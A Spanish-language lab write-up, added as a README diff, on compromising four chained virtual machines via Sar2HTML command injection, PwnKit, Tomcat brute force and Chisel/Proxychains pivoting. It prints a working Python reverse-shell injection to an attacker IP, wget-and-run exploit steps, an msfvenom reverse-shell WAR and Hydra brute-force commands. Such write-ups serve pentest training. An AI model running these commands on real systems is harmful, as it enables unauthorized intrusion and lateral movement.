@@ -1,1 +1,649 @@
-# redteam
+# Pivoting
+# Pivoting con Chisel, Proxychains y SOCKS
+
+Writeup de un laboratorio de **pivoting** compuesto por **cuatro máquinas virtuales** interconectadas en distintas subredes, comprometidas de forma progresiva mediante técnicas de enumeración, explotación de servicios, escalada de privilegios y pivoting con túneles SOCKS.
+
+**Objetivo:** obtener acceso `root` en las cuatro máquinas y recopilar las flags de cada una, demostrando movimiento lateral entre redes internas no accesibles directamente desde la máquina atacante.
+
+## Resumen del flujo de ataque
+
+```
+Kali (10.0.2.14)
+  │  Explotación HTTP (Sar2HTML → RCE)
+  ▼
+VM1 (10.0.2.8 / 10.0.3.4)            ← pivote 1
+  │  Túnel Chisel SOCKS (puerto 1080)
+  ▼
+VM2 (10.0.3.5 / 10.0.4.4)            ← pivote 2
+  │  Túnel Chisel SOCKS (puertos 1081 / 1082)
+  ▼
+VM3 (10.0.4.5 / 10.0.5.4)            ← pivote 3
+  │  Túnel Chisel SOCKS
+  ▼
+VM4 (10.0.5.5)                       ← objetivo final
+```
+
+| Máquina | IPs | Vector inicial | Escalada a root |
+|---|---|---|---|
+| VM1 | `10.0.2.8` / `10.0.3.4` | RCE en Sar2HTML (CVE-2025-34030) | PwnKit (CVE-2021-4034) |
+| VM2 | `10.0.3.5` / `10.0.4.4` | Credenciales SSH por diccionario | `sudo su` (usuario en sudoers) |
+| VM3 | `10.0.4.5` / `10.0.5.4` | Apache Tomcat – credenciales por fuerza bruta + WAR malicioso | PwnKit (CVE-2021-4034) |
+| VM4 | `10.0.5.5` | Credenciales SSH por fuerza bruta (rockyou) | `sudo su` (usuario en sudoers) |
+
+## Herramientas utilizadas
+
+- **arp-scan**, **nmap** — descubrimiento de red y enumeración de servicios
+- **Sar2HTML (CVE-2025-34030)** — RCE no autenticada
+- **PwnKit / CVE-2021-4034** — escalada local de privilegios en `pkexec`
+- **Chisel** — túneles cifrados HTTP/WebSocket para pivoting (cliente/servidor SOCKS)
+- **Proxychains** — encadenamiento de proxies SOCKS para enrutar herramientas a través de los túneles
+- **Hydra** — fuerza bruta de credenciales (SSH, HTTP Basic Auth)
+- **Gobuster / dirb / ffuf** — fuzzing de directorios web
+- **msfvenom** — generación de payload reverse shell (WAR malicioso para Tomcat)
+- **hash-identifier**, **hashcat** — identificación y (intento de) cracking de hashes
+
+---
+
+## 1. Descubrimiento inicial de red
+
+Desde la máquina Kali, se lanza un escaneo ARP para descubrir hosts en la red local:
+
+```bash
+sudo arp-scan --interface=eth1 --localnet
+```
+
+Con `ip a` se confirma la IP propia de la máquina atacante: **10.0.2.14**.
+
+![Descubrimiento de red con arp-scan](screenshots/page_01.png)
+
+Se organiza el espacio de trabajo creando un directorio por cada máquina objetivo:
+
+```bash
+mkdir -p pivoting/{vm1,vm2,vm3,vm4}
+```
+
+Tras detectar el host `10.0.2.8`, se lanza un escaneo de puertos y servicios más profundo:
+
+```bash
+sudo nmap -sV -Pn -sS -O -n 10.0.2.8 -o /home/kali/pivoting/vm1/nmap.txt
+```
+
+| Flag | Significado |
+|---|---|
+| `-sV` | Detección de versión de servicios |
+| `-Pn` | No enviar ping (tratar el host como activo) |
+| `-sS` | Escaneo TCP SYN (half-open) |
+| `-O` | Detección de sistema operativo |
+| `-n` | Sin resolución DNS |
+| `-o` | Guardar salida en archivo |
+
+---
+
+## 2. VM1 — Explotación de Sar2HTML (CVE-2025-34030)
+
+El escaneo revela que solo el **puerto 80** está abierto. Al acceder desde Firefox aparece la página por defecto de Apache2.
+
+![Página por defecto de Apache2](screenshots/page_02.png)
+
+Fuzzeando manualmente, `robots.txt` revela una ruta hacia **sar2HTML**, accesible en `/Sar2HTML`.
+
+La versión **3.2.2 y anteriores** de Sar2HTML es vulnerable a **CVE-2025-34030**: inyección de comandos del sistema operativo no autenticada a través del parámetro `plot` en `index.php`.
+
+### Explotación
+
+Se pone en escucha un listener con netcat:
+
+```bash
+nc -lnvp 4444
+```
+
+Y se inyecta una reverse shell en Python a través del parámetro vulnerable:
+
+```bash
+curl "http://10.0.2.8/sar2HTML/index.php?plot=;python3+-c+'import+socket,subprocess,os;\
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
+s.connect((\"10.0.2.14\",4444));\
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\
+import+pty;pty.spawn(\"/bin/bash\")';"
+```
+
+Se obtiene una reverse shell como el usuario `www-data` (`data`):
+
+![Reverse shell como www-data](screenshots/page_03.png)
+
+### Estabilización de la shell
+
+La shell inicial no es una TTY completa. Se estabiliza con:
+
+```bash
+clear            # confirma que la shell no está "vitaminada"
+export TERM=xterm
+whoami && id && hostname && uname -a && arch
+```
+
+Se listan los ficheros disponibles con `ls -la` y se comprueba `sudo -l`, sin éxito (se requiere contraseña que no se conoce).
+
+---
+
+## 3. VM1 — Escalada a root con PwnKit (CVE-2021-4034)
+
+Se buscan binarios con el bit **SUID** activo, ejecutables como root:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Entre los resultados aparece `/usr/bin/pkexec`. Se comprueba la versión:
+
+```bash
+pkexec --version
+# pkexec version 0.105
+```
+
+![Búsqueda de binarios SUID y versión de pkexec](screenshots/page_04.png)
+
+La versión **≤ 0.105** de `pkexec` es vulnerable a **CVE-2021-4034 (PwnKit)**: una mala validación de variables de entorno permite escalada local a `root` sin autenticación.
+
+### Pasos
+
+1. Se clona el exploit en Kali:
+   ```bash
+   git clone https://github.com/ly4k/PwnKit.git
+   ```
+2. Se comprueba que la arquitectura objetivo es `x86-64`:
+   ```bash
+   file PwnKit
+   ```
+3. Se sirve el exploit desde Kali con un servidor HTTP:
+   ```bash
+   python3 -m http.server 8080
+   ```
+4. Desde la shell de `www-data` en VM1, se descarga y ejecuta:
+   ```bash
+   wget http://10.0.2.4:8080/PwnKit
+   chmod +x PwnKit
+   ./PwnKit
+   whoami   # root
+   ```
+
+![Descarga, permisos y ejecución de PwnKit obteniendo root](screenshots/page_05.png)
+
+### Banderas obtenidas
+
+Con `root`, se accede a `/home/love/Desktop` y a `/root`, encontrando dos hashes MD5:
+
+```
+/home/love/Desktop/user.txt → 427a7e47deb4a8649c7cab38df232b52
+/root/root.txt              → 66f93d6b2ca96c9ad78a8a9ba0008e99
+```
+
+`hash-identifier` confirma que ambos son **hashes MD5**. Se guardan en `vm1/hash_love_vm1.txt` y `vm1/hash_root_vm1.txt`. Probar con `hashcat` y diccionarios comunes no produce resultados en esta fase.
+
+![Identificación de hashes MD5 con hash-identifier](screenshots/page_06.png)
+
+---
+
+## 4. Pivoting hacia la red 10.0.3.0/24 con Chisel
+
+Renombramos la sesión de root en VM1 como **"vm1"** (`Mayús + Alt + S` en la terminal).
+
+Con `ip a` se descubre una segunda interfaz, `enp0s8`, con IP **10.0.3.4/24**. Con `arp -a` se localiza un host vecino: **10.0.3.3**.
+
+### Preparación de binarios
+
+Se compilan y comprimen los binarios necesarios (`nmap`, `chisel`) y se sirven desde Kali:
+
+```bash
+python3 -m http.server 8080
+```
+
+Desde VM1 (con `root`), se descargan a `/opt` (en lugar de `/tmp`, para no perderlos en un reinicio):
+
+```bash
+cd /opt
+wget http://10.0.2.14:8080/chisel
+chmod +x *
+```
+
+### Levantar el túnel Chisel
+
+En Kali, se levanta el servidor Chisel en modo `reverse`:
+
+```bash
+./chisel server -p 9000 --reverse
+```
+
+Desde VM1 (cliente), se conecta exponiendo un proxy **SOCKS** inverso:
+
+```bash
+./chisel client 10.0.2.14:9000 R:socks
+```
+
+> **Chisel** crea un túnel cifrado sobre HTTP/HTTPS, útil para pivotar entre redes que normalmente no serían alcanzables desde la máquina atacante por estar detrás de un firewall.
+
+Esto expone un proxy SOCKS en `127.0.0.1:1080` en Kali. Se añade a `/etc/proxychains4.conf`:
+
+```ini
+[ProxyList]
+# defaults set to "tor"
+socks5  127.0.0.1  1080
+```
+
+(Configurado en modo `dynamic_chain`.)
+
+![Configuración del túnel Chisel y proxychains](screenshots/page_07.png)
+
+---
+
+## 5. Descubrimiento en 10.0.3.0/24 y acceso a VM2
+
+Un escaneo `nmap` directo desde VM1 contra `10.0.3.3` devuelve todos los puertos **filtrados** (parece un honeypot/firewall), así que se descarta y se lanza un descubrimiento por ping directamente desde la pivote:
+
+```bash
+for i in {1..254}; do ping -c1 -W1 10.0.3.$i >/dev/null && echo "Host vivo: 10.0.3.$i"; done
+```
+
+| Flag de nmap | Significado |
+|---|---|
+| `-sT` | Solo conexiones TCP completas |
+| `--top-ports` | Escanea los N puertos más comunes |
+| `-T5` | Velocidad de escaneo máxima |
+| `-Pn` | Sin descubrimiento ICMP |
+
+![Escaneo descartado y descubrimiento por ping desde la pivote](screenshots/page_08.png)
+
+Se descubren los hosts `10.0.3.1` al `10.0.3.5`. Con `proxychains`, se confirma el puerto 80 abierto en **10.0.3.5**:
+
+```bash
+proxychains curl -v http://10.0.3.5:80
+```
+
+Y se fuzzea con gobuster a través del proxy SOCKS:
+
+```bash
+gobuster dir -u http://10.0.3.5 \
+  -w /usr/share/wordlists/dirb/common.txt \
+  --proxy socks5://127.0.0.1:1080
+```
+
+![Fuzzing de directorios vía proxychains + gobuster](screenshots/page_09.png)
+
+### Credenciales por diccionario
+
+La enumeración revela un fichero `diccionario.txt` en `/uploads`:
+
+```bash
+proxychains curl -v http://10.0.3.5/uploads/diccionario.txt
+proxychains wget http://10.0.3.5/uploads/diccionario.txt
+```
+
+Con `hydra` y proxychains, se prueba el diccionario contra SSH para el usuario `ubuntu`:
+
+```bash
+proxychains hydra -l ubuntu -P diccionario.txt ssh://10.0.3.5
+```
+
+**Resultado:** `ubuntu:liverpool`
+
+Se accede vía SSH abriendo además un proxy SOCKS local en el puerto **1081** (para encadenar el siguiente salto):
+
+```bash
+proxychains ssh -D 1081 ubuntu@10.0.3.5
+```
+
+Y se añade el nuevo puerto a `/etc/proxychains4.conf`:
+
+```ini
+socks5  127.0.0.1  1080
+socks5  127.0.0.1  1081
+```
+
+![Acceso SSH a VM2 con credenciales del diccionario](screenshots/page_10.png)
+
+---
+
+## 6. VM2 — Escalada trivial y nuevo pivote a 10.0.4.0/24
+
+Dentro de VM2 se encuentra `file.txt` (contenido: "hola") y `flag.zip`, que se descomprime con la contraseña **`thebridgepivoting`**, revelando la palabra **"Puertos"**.
+
+Identificación del sistema:
+
+```bash
+whoami && id && hostname -a && arch
+# arquitectura: i686 → binarios de 32 bits
+```
+
+El usuario `ubuntu` pertenece a `sudoers`. Con la misma contraseña usada para SSH:
+
+```bash
+sudo -l
+sudo su      # → root inmediato
+```
+
+Con `ip a` se descubre la siguiente red: **10.0.4.0/24**.
+
+### Nuevo túnel Chisel (32 bits)
+
+Se sirve `chisel32` desde VM1 (`/opt`):
+
+```bash
+# en VM1
+python3 -m http.server 9006
+```
+
+```bash
+# en VM2
+wget http://10.0.3.4:9006/chisel32
+chmod +x chisel32
+./chisel32 client 10.0.3.4:9001 R:1082:socks
+```
+
+Se añade el puerto **1082** a `proxychains4.conf`:
+
+```ini
+socks5  127.0.0.1  1080
+socks5  127.0.0.1  1081
+socks5  127.0.0.1  1082
+```
+
+![Descarga de chisel32 y nuevo túnel SOCKS hacia 10.0.4.0/24](screenshots/page_11.png)
+
+---
+
+## 7. Enumeración de 10.0.4.0/24 — Apache Tomcat en VM3
+
+Con `proxychains` ya se alcanza la red `10.0.4.0/24`, donde la máquina ubuntu es **10.0.4.4**. Desde una nueva shell SSH a VM2:
+
+```bash
+arp -a -i enp0s8
+```
+
+Se descubre **10.0.4.5**. Un escaneo de puertos revela un servicio interesante:
+
+```bash
+nmap -sS -p 1-10000 10.0.4.5 --open
+```
+
+```bash
+curl http://10.0.4.5:8080
+# → Apache Tomcat
+```
+
+![Descubrimiento de Apache Tomcat en el puerto 8080](screenshots/page_12.png)
+
+### Enumeración web con dirb
+
+```bash
+proxychains dirb http://10.0.4.5:8080 /usr/share/wordlists/dirb/common.txt
+```
+
+Se descubren las rutas `/docs`, `/examples`, `/host-manager`, `/index.html`, `/manager`.
+
+> **Hallazgo:** el servicio en `10.0.4.5:8080` corresponde a **Apache Tomcat 8.0.32**, con documentación accesible públicamente — una mala configuración. El hecho de que solo sea alcanzable desde la red interna confirma que el pivoting funciona correctamente. Al ser una versión de 2020, es susceptible a vulnerabilidades conocidas, y el sistema es probablemente Debian/Ubuntu con el paquete `tomcat8`.
+
+Para facilitar la navegación, se configura **FoxyProxy** apuntando al proxy SOCKS en `127.0.0.1:1080`, con resolución DNS por proxy activada.
+
+![Enumeración con dirb y configuración de FoxyProxy](screenshots/page_13.png)
+
+---
+
+## 8. VM3 — Acceso a Tomcat Manager y reverse shell con WAR
+
+El acceso a `/manager/html` solicita autenticación HTTP Basic. Tras probar credenciales por defecto sin éxito, se usa `hydra` con el diccionario de credenciales por defecto de Tomcat (SecLists):
+
+```bash
+proxychains hydra -C /home/kali/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
+  10.0.4.5 -s 8080 http-get /manager/html -t 1 -w 10 -f -o pass_tomcat.txt
+```
+
+| Parámetro | Significado |
+|---|---|
+| `10.0.4.5` | IP objetivo (Tomcat) |
+| `-s 8080` | Puerto donde corre Tomcat |
+| `http-get` | Tipo de autenticación HTTP Basic |
+| `/manager/html` | Ruta protegida atacada |
+| `-t 1` | Un solo hilo (recomendado al pivotar por proxy) |
+| `-w 10` | Timeout de 10s por intento |
+| `-f` | Detenerse al encontrar una credencial válida |
+| `-o` | Fichero de salida |
+
+**Resultado:** `cxsdk:kdsxc`
+
+![Fuerza bruta de credenciales de Tomcat Manager y acceso al panel](screenshots/page_14.png)
+
+### Generación y despliegue de un WAR malicioso
+
+Se pone en escucha netcat en VM2 (la IP intermedia accesible desde Tomcat):
+
+```bash
+nc -lvnp 4444
+```
+
+Se genera el payload con `msfvenom`:
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.4.4 LPORT=4444 -f war -o shell.war
+```
+
+Se despliega el WAR `shell.war` desde el panel de Tomcat Manager (Deploy → WAR file to deploy). Tras la subida, aparece la aplicación `/shell` en el listado.
+
+![Generación del WAR con msfvenom y despliegue en Tomcat](screenshots/page_15.png)
+
+Al acceder a la ruta `/shell` se activa la reverse shell, recibida en el listener de VM2:
+
+```bash
+whoami && id
+# tomcat8 (uid=122, gid=129)
+```
+
+### Estabilización
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm
+```
+
+![Reverse shell recibida como tomcat8 y estabilización](screenshots/page_16.png)
+
+---
+
+## 9. VM3 — Escalada a root (PwnKit, de nuevo)
+
+Con `ip route` se descubre la siguiente red: **10.0.5.0/24** (interfaz `enp0s8`, IP `10.0.5.4`).
+
+En `/usr/share/tomcat8` se encuentran ficheros `.md5sum` (`defaults.md5sum`, `logrotate.md5sum`). **Nota:** estos ficheros solo contienen checksums de integridad, no son contraseñas y no representan un vector de ataque.
+
+`sudo -l` no permite avanzar sin la contraseña de `tomcat8`. Se repite la búsqueda de binarios SUID:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+De nuevo aparece **`pkexec`**, vulnerable a **PwnKit (CVE-2021-4034)**.
+
+![Descubrimiento de la red 10.0.5.0/24 y binarios SUID](screenshots/page_17.png)
+
+### Explotación
+
+Se sirve el binario `PwnKit` desde VM1 (`10.0.3.4`, puerto 1000) hacia VM2:
+
+```bash
+# en VM1
+python3 -m http.server 1000
+```
+```bash
+# en VM2
+wget http://10.0.3.4:1000/PwnKit
+```
+
+Y de nuevo desde VM2 (`10.0.4.4`, puerto 1001) hacia VM3:
+
+```bash
+# en VM2
+python3 -m http.server 1001
+```
+```bash
+# en VM3 (tomcat8)
+wget http://10.0.4.4:1001/PwnKit
+chmod +x PwnKit
+./PwnKit
+whoami   # root
+```
+
+![Servir y ejecutar PwnKit en VM3 alcanzando root](screenshots/page_18.png)
+
+Se copia `PwnKit` (y posteriormente `chisel`) a `/opt` para persistencia ante reinicios.
+
+---
+
+## 10. Pivoting final hacia 10.0.5.0/24 y acceso a VM4
+
+Con la interfaz `enp0s8` de VM3 en **10.0.5.4/24**, `arp -a -i enp0s8` revela `10.0.5.1` y `10.0.5.3`. Basándose en patrones anteriores, se hace ping directo a `10.0.5.5`, que responde aunque no apareciera en la tabla ARP:
+
+```bash
+ping 10.0.5.5
+```
+
+![Descubrimiento de la red 10.0.5.0/24 y host 10.0.5.5](screenshots/page_19.png)
+
+### Tercer túnel Chisel
+
+En VM2 (`10.0.4.4`) se levanta un nuevo servidor Chisel:
+
+```bash
+./chisel32 server -p 9000 --reverse
+```
+
+Desde VM3, se conecta como cliente exponiendo un nuevo proxy SOCKS:
+
+```bash
+./chisel client 10.0.4.4:9000 R:socks
+```
+
+Se añade el puerto **1082** (o el correspondiente) a `proxychains4.conf`:
+
+```ini
+socks5  127.0.0.1  1080
+socks5  127.0.0.1  1081
+socks5  127.0.0.1  1082
+```
+
+---
+
+## 11. VM4 — Enumeración y acceso final
+
+Con el nuevo socks ya activo, se prueba conexión desde Kali:
+
+```bash
+proxychains curl http://10.0.5.5
+```
+
+Confirmando un sistema **Ubuntu** con Apache2.
+
+### Limitaciones de las herramientas de fuzzing por múltiples saltos
+
+`gobuster`, `ffuf` y `nmap` no funcionan de forma fiable a través de varios saltos de proxychains:
+
+```bash
+gobuster dir -u http://10.0.5.5 -w /usr/share/wordlists/dirb/common.txt \
+  -x txt,html,zip --proxy socks5://127.0.0.1:1082 -o gobuster.txt
+
+proxychains ffuf -u http://10.0.5.5/FUZZ -w /usr/share/wordlists/dirb/common.txt \
+  -e .txt,.html,.zip -o ffuf.json
+```
+
+Por eso se recurre a enumeración **manual** con `curl`, que sí funciona correctamente a través de la cadena de proxies:
+
+```bash
+proxychains curl http://10.0.5.5/index.html   # página por defecto de Apache2/Ubuntu
+proxychains curl http://10.0.5.5/robots.txt   # 404, pero revela: Apache/2.4.29 (Ubuntu)
+```
+
+![Enumeración manual con curl a través de la cadena de proxies](screenshots/page_18.png)
+
+En `flag.html` aparecen dos enlaces a YouTube que reproducen *"We Are the Champions"* de Queen — un guiño del laboratorio confirmando el éxito del pivoting hasta este punto.
+
+### Acceso SSH por fuerza bruta
+
+Se confirma el puerto 22 accesible vía proxychains. Usando el nombre de usuario `ubuntu` (visto en el `index.html`):
+
+```bash
+proxychains hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://10.0.5.5
+```
+
+**Resultado:** `ubuntu:ubuntu`
+
+```bash
+proxychains ssh ubuntu@10.0.5.5
+whoami && id && uname -a
+```
+
+El usuario pertenece al grupo `sudo`:
+
+```bash
+sudo su
+whoami   # root
+```
+
+![Enlaces de Queen, fuerza bruta SSH y escalada con sudo su en VM4](screenshots/page_19.png)
+
+### Bandera final
+
+En `~/Desktop` se encuentra `flag.zip`, protegido con la misma contraseña usada anteriormente (**`thebridgepivoting`**):
+
+```bash
+unzip flag.zip
+cat flag.txt
+# Cuantos...
+```
+
+![Descompresión de la flag final en VM4](screenshots/page_20.png)
+
+---
+
+## Conclusión
+
+En este laboratorio se llevó a cabo el compromiso progresivo de un entorno compuesto por cuatro máquinas virtuales distribuidas en distintas subredes internas. Mediante enumeración, explotación de servicios vulnerables, escalada de privilegios y pivoting con túneles SOCKS basados en **Chisel**, se obtuvo acceso `root` en todas las máquinas.
+
+El ejercicio demuestra movimiento lateral entre redes no accesibles directamente desde la máquina atacante, comprometiendo servicios web (Sar2HTML, Apache Tomcat), SSH, y explotando vulnerabilidades locales conocidas como **CVE-2021-4034 (PwnKit)**, repetida en dos de las cuatro máquinas.
+
+### Lecciones clave
+
+- **Servicios desactualizados** (Sar2HTML 3.2.2, Tomcat 8.0.32, `pkexec` ≤ 0.105) siguen siendo vectores de explotación viables años después de publicarse el CVE correspondiente.
+- **Credenciales débiles o por defecto** (diccionarios expuestos, `tomcat:s3cret`-style, `ubuntu:ubuntu`) permiten movimientos laterales rápidos sin necesidad de exploits complejos.
+- **El pivoting en cadena con Chisel + Proxychains** permite alcanzar redes completamente aisladas de la red del atacante, replicando escenarios reales de redes corporativas segmentadas.
+- Herramientas de fuzzing pesadas (`gobuster`, `ffuf`, `nmap`) degradan su fiabilidad a medida que aumenta el número de saltos SOCKS; en esos casos, **`curl` manual** es más robusto.
+
+### Árbol de directorios del proyecto
+
+```
+pivoting/
+├── chisel
+├── chisel32
+├── diccionario.txt
+├── vm1/
+│   ├── hash_love_vm1.txt
+│   ├── hash_root_vm1.txt
+│   ├── nmap.txt
+│   └── PwnKit/
+│       ├── PwnKit
+│       ├── PwnKit32
+│       ├── PwnKit.c
+│       ├── PwnKit.sh
+│       └── README.md
+├── vm2/
+│   └── diccionario.txt
+├── vm3/
+│   ├── pass_tomcat.txt
+│   ├── shell.jsp
+│   └── shell.war
+└── vm4/
+    ├── ffuf.txt
+    ├── gobuster.txt
+    └── pass_vm4.txt
+```
+
+---
+
+## Disclaimer
+
+Este writeup documenta un ejercicio realizado en un **entorno de laboratorio controlado y aislado** con fines educativos (formación en pentesting/pivoting). Las técnicas descritas no deben aplicarse contra sistemas sin autorización explícita.
